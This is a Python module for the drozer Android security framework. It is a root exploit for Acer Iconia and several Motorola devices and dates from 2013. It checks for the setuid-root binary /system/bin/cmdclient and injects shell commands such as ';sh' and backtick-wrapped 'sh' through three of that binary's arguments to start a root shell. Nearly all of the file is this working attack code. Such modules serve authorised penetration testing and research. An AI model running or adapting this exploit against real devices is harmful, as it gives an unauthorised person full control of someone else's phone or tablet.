from drozer.modules import common, Module

class CmdClient(Module, common.Vulnerability, common.Shell, common.FileSystem, common.ClassLoader):
    
    name = "Obtain a root shell on an Acer Iconia and various Motorola devices."
    description = """Exploit the setuid-root binary at /system/bin/cmdclient on certain devices to gain a root shell. Command injection vulnerabilities exist in the parsing mechanisms of the various input arguments.
    
This exploit has been reported to work on the Acer Iconia, Motorola XYBoard and Motorola Xoom FE.
"""
    examples = """
    dz> run exploit.root.cmdclient
    # id
    uid=0(root) gid=0(root)
    """
    author = ["sc2k (xdadevelopers)", "abliss (xdadevelopers)", "Dan Rosenburg (@djrbliss)", "Tyrone (@mwrlabs)"]
    date = "2013-01-09"
    license = "BSD (3 clause)"
    path = ["exploit", "root"]
    
    def isVulnerable(self, arguments):
        
        if self.exists("/system/bin/cmdclient"):
            return True
        else:
            return False

    def exploit(self, arguments):

        if "root" in self.shellExec("cmdclient misc_command ';sh -c id'"):
            self.shellStart("cmdclient misc_command ';sh'")                     # sc2k
        elif "root" in self.shellExec("cmdclient ec_micswitch '`sh -c id`'"):
            self.shellStart("cmdclient ec_micswitch '`sh`'")                    # abliss        
        elif "root" in self.shellExec("cmdclient ec_skunumber ';sh -c id;'"):
            self.shellStart("cmdclient ec_skunumber ';sh;'")                    # Dan Rosenburg
        else:
            self.stdout.write("Exploit failed to conjure a root shell.\n")
        
        
        
